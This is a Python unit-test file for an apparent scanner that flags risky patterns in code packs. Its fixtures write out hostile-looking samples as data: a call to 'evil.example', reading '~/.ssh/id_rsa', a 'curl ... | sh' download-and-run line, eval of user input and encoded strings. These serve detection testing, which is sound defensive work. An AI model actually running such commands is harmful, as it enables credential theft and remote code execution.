import os
import subprocess
import sys
import tempfile
import unittest

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, os.path.join(ROOT, "scripts"))
import audit_packs as A  # noqa: E402


class AuditTests(unittest.TestCase):
    def setUp(self):
        self.d = tempfile.mkdtemp(prefix="hs-audit-")
        self.addCleanup(lambda: __import__("shutil").rmtree(self.d, ignore_errors=True))

    def put(self, rel, body):
        p = os.path.join(self.d, rel)
        os.makedirs(os.path.dirname(p), exist_ok=True)
        open(p, "w", encoding="utf-8").write(body)

    def test_each_category_is_found_in_code(self):
        self.put("a.py", "import subprocess\nsubprocess.run(['ls'])\nrequests.get('https://evil.example/x')\neval(user)\nopen(os.path.expanduser('~/.ssh/id_rsa'))\n")
        self.put("b.sh", "curl https://x.example/i.sh | sh\nnpx -y something\n")
        self.put("c.js", "const s = atob('aGVsbG8=');\n")
        r = A.scan_dir(self.d)
        for k in ("network", "run-programs", "dynamic-code", "credentials", "download-and-run", "obfuscation"):
            self.assertGreater(r["counts"][k], 0, k)
        self.assertIn("evil.example", r["hosts"])

    def test_prose_urls_and_method_calls_are_not_counted_as_code(self):
        self.put("README.md", "See https://docs.example/guide and run `npm install foo`.\nUse subprocess.run in your code.\n")
        self.put("m.js", "const m = /a(b)/.exec(text);\nconst n = re.exec(x);\n")
        r = A.scan_dir(self.d)
        self.assertEqual(r["counts"]["run-programs"], 0)
        self.assertEqual(r["counts"]["dynamic-code"], 0)
        self.assertEqual(r["hosts"], [], "a URL in documentation is not a call")
        self.assertEqual(r["counts"]["download-and-run"], 1, "an install command in documentation is still worth a look")

    def test_nothing_is_executed_and_symlinks_are_not_followed(self):
        marker = os.path.join(self.d, "ran.txt")
        self.put("evil.py", "open(%r, 'w').write('x')\nimport os; os.system('true')\n" % marker)
        outside = tempfile.mkdtemp(prefix="hs-audit-out-")
        self.addCleanup(lambda: __import__("shutil").rmtree(outside, ignore_errors=True))
        open(os.path.join(outside, "x.py"), "w").write("os.system('x')\n")
        os.symlink(outside, os.path.join(self.d, "link"))
        r = A.scan_dir(self.d)
        self.assertFalse(os.path.exists(marker))
        self.assertEqual(r["counts"]["run-programs"], 1, "only the real file counts, not the symlinked folder")

    def test_the_report_says_it_is_not_a_review_and_lists_hits(self):
        self.put("a.py", "os.system('x')\n")
        text = A.render([("pack/a", A.scan_dir(self.d))])
        self.assertIn("not a security review", text)
        self.assertIn("a.py:1", text)

    def test_the_committed_report_covers_every_pack(self):
        text = open(os.path.join(ROOT, "docs", "pack-audit.md"), encoding="utf-8").read()
        for name in os.listdir(os.path.join(ROOT, "packs")):
            if os.path.isdir(os.path.join(ROOT, "packs", name)):
                self.assertIn("`packs/%s`" % name, text, name)


if __name__ == "__main__":
    unittest.main()
